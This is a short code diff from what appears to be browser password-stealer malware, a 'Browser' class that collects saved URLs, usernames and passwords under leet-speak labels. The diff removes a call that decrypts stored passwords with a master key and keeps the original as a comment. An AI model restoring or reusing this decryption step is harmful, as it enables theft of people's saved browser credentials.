@@ -54,4 +54,5 @@ class Browser:
 
         for row in data:
             if row[0] != '':
-                self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {HelpersSilentScript.DecryptValue(row[2], master_key)}")
+                self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD:")
+                # self.Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {HelpersSilentScript.DecryptValue(row[2], master_key)}")
